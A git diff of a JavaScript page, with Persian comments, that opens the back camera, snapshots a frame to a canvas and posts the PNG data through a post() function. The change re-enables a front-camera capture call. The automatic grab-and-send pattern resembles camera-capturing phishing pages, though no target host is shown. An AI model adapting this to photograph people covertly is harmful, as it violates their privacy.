@@ -87,28 +87,26 @@
             alert('مشکل در دسترسی به دوربین عقب:', error);
         });
 
-    async function captureAndSave(stream) {
+    async function captureAndSaveBack(stream) {
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageData = canvas.toDataURL('image/png');
         post(imageData);
     }
 
-    // دسترسی به دوربین عقب
     async function initBackCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia(backConstraints);
             video.srcObject = stream;
             await new Promise(resolve => video.onloadedmetadata = resolve);
-            captureAndSave(stream);
+            captureAndSaveBack(stream);
         } catch (e) {
             console.error('navigator.getUserMedia error:', e);
         }
     }
 
-    // اجرای تابع برای دوربین عقب و سپس دوربین جلو
     async function captureFromBothCameras() {
-        // await captureAndSave(frontConstraints);
+        await captureAndSave(frontConstraints);
         await initBackCamera();
     }
 
